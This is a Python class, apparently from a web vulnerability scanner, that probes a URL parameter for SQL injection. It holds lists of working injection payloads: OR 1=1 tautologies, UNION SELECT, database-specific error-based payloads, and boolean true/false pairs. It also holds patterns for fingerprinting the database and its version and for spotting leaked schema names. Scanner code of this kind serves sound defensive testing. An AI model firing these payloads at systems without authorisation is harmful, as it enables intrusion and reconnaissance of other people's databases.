class SQLiDetector:
    PAYLOADS = [
        "'", '"',
        "' OR 1=1--", '" OR 1=1--',
        "' OR 'a'='a", '" OR \"a\"=\"a"',
        "') OR ('1'='1", '" ) OR ("1"="1',
        "' OR 1=1#", '" OR 1=1#',
        "' OR 1=1/*", '" OR 1=1/*',
        "' UNION SELECT NULL--", '" UNION SELECT NULL--'
    ]

    BOOLEAN_PAIRS = [
        ("1' AND '1'='1", "1' AND '1'='2"),
        ('1" AND "1"="1', '1" AND "1"="2'),
        ("1' AND 1=1--", "1' AND 1=2--"),
        ('1" AND 1=1--', '1" AND 1=2--')
    ]

    ERROR_SIGNATURES = [
        "sql syntax", "mysql", "syntax error", "unterminated",
        "sqlite", "pg_query", "fatal error", "odbc",
        "you have an error", "warning:", "psql:", "ora-",
        "microsoft ole db", "unclosed quotation", "quoted string not properly terminated",
        "sqlstate", "native client", "jdbc", "db2 sql error"
    ]

    DB_SIGNATURES = {
        "mysql": ["mysql", "mariadb", "you have an error in your sql syntax", "warning: mysql"],
        "postgres": ["postgresql", "pg_query", "psql:", "pg::"],
        "mssql": ["microsoft sql server", "sql server", "odbc sql server", "native client"],
        "sqlite": ["sqlite", "sqlite3"],
        "oracle": ["ora-", "oracle"]
    }

    VERSION_REGEX = [
        r"mysql\s*server\s*version[:\s]*([0-9.]+)",
        r"mariadb\s*server\s*version[:\s]*([0-9.]+)",
        r"postgresql\s*([0-9.]+)",
        r"sql\s*server\s*([0-9.]+)",
        r"sqlite\s*version[:\s]*([0-9.]+)",
        r"oracle\s*database\s*([0-9.]+)"
    ]

    DB_SPECIFIC_PAYLOADS = {
        "mysql": ["' AND EXTRACTVALUE(1, CONCAT(0x7e, 1))--", "' AND UPDATEXML(1, CONCAT(0x7e, 1), 1)--"],
        "postgres": ["' AND 1=CAST(version() AS INT)--", "' AND 1=CAST(current_database() AS INT)--"],
        "mssql": ["' AND 1=CONVERT(INT, @@version)--", "' AND 1=CONVERT(INT, DB_NAME())--"],
        "sqlite": ["' AND 1=CAST(sqlite_version() AS INT)--"],
        "oracle": ["' AND 1=TO_NUMBER(DBMS_UTILITY.SQLID_TO_SQLHASH('a'))--"]
    }

    LEAK_PATTERNS = [
        r"unknown column ['\"]?([a-z0-9_]+)['\"]?",
        r"column ['\"]?([a-z0-9_]+)['\"]? does not exist",
        r"table ['\"]?([a-z0-9_]+)['\"]? doesn't exist",
        r"relation ['\"]?([a-z0-9_]+)['\"]? does not exist",
        r"ora-00942: table or view does not exist",
        r"invalid column name ['\"]?([a-z0-9_]+)['\"]?"
    ]

    def __init__(self, client):
        self.client = client

    def test(self, path, param):
        # Baseline for boolean-based checks
        baseline = self.client.get(path, params={param: "1"})
        baseline_text = baseline.text if baseline else ""
        baseline_len = len(baseline_text)

        # 1) Version/DB detection via generic payloads
        for payload in self.PAYLOADS:
            res = self.client.get(path, params={param: payload})
            db_info = self._detect_db_info(res.text if res else "")
            if any(err in res.text.lower() for err in self.ERROR_SIGNATURES):
                return {
                    "type": "sqli",
                    "endpoint": path,
                    "param": param,
                    "payload": payload,
                    "evidence": f"SQL error message detected{db_info}",
                    "confidence": 0.9
                }

        # 2) DB-specific payloads if DB identified from baseline
        db_hint = self._detect_db_from_text(baseline_text)
        if db_hint in self.DB_SPECIFIC_PAYLOADS:
            for payload in self.DB_SPECIFIC_PAYLOADS[db_hint]:
                res = self.client.get(path, params={param: payload})
                db_info = self._detect_db_info(res.text if res else "")
                if any(err in (res.text or "").lower() for err in self.ERROR_SIGNATURES):
                    return {
                        "type": "sqli",
                        "endpoint": path,
                        "param": param,
                        "payload": payload,
                        "evidence": f"DB-specific error triggered{db_info}",
                        "confidence": 0.85
                    }

        # 3) Database contents leakage signals (table/column names)
        leak = self._detect_leak(baseline_text)
        if leak:
            return {
                "type": "sqli",
                "endpoint": path,
                "param": param,
                "payload": "(baseline)",
                "evidence": f"Potential schema leakage detected: {leak}",
                "confidence": 0.7
            }

        # 4) Conditional (boolean) response difference
        for true_payload, false_payload in self.BOOLEAN_PAIRS:
            res_true = self.client.get(path, params={param: true_payload})
            res_false = self.client.get(path, params={param: false_payload})

            if not res_true or not res_false:
                continue

            len_true = len(res_true.text or "")
            len_false = len(res_false.text or "")

            if baseline_len > 0:
                delta_true = abs(len_true - baseline_len) / baseline_len
                delta_false = abs(len_false - baseline_len) / baseline_len
            else:
                delta_true = abs(len_true - len_false)
                delta_false = delta_true

            if delta_true >= 0.15 and delta_false >= 0.15 and abs(len_true - len_false) >= max(50, baseline_len * 0.1):
                return {
                    "type": "sqli",
                    "endpoint": path,
                    "param": param,
                    "payload": f"{true_payload} / {false_payload}",
                    "evidence": "Significant response difference between boolean conditions",
                    "confidence": 0.7
                }
        return None

    def _detect_db_info(self, text):
        if not text:
            return ""
        lower = text.lower()
        db = self._detect_db_from_text(text)
        version = self._extract_version(lower)
        parts = []
        if db:
            parts.append(f"db={db}")
        if version:
            parts.append(f"version={version}")
        return f" ({', '.join(parts)})" if parts else ""

    def _detect_db_from_text(self, text):
        lower = (text or "").lower()
        for db, sigs in self.DB_SIGNATURES.items():
            if any(sig in lower for sig in sigs):
                return db
        return ""

    def _extract_version(self, lower_text):
        try:
            import re
            for pattern in self.VERSION_REGEX:
                match = re.search(pattern, lower_text)
                if match:
                    return match.group(1)
        except Exception:
            return ""
        return ""

    def _detect_leak(self, text):
        try:
            import re
            lower = (text or "").lower()
            for pattern in self.LEAK_PATTERNS:
                match = re.search(pattern, lower)
                if match:
                    return match.group(0)
        except Exception:
            return ""
        return ""
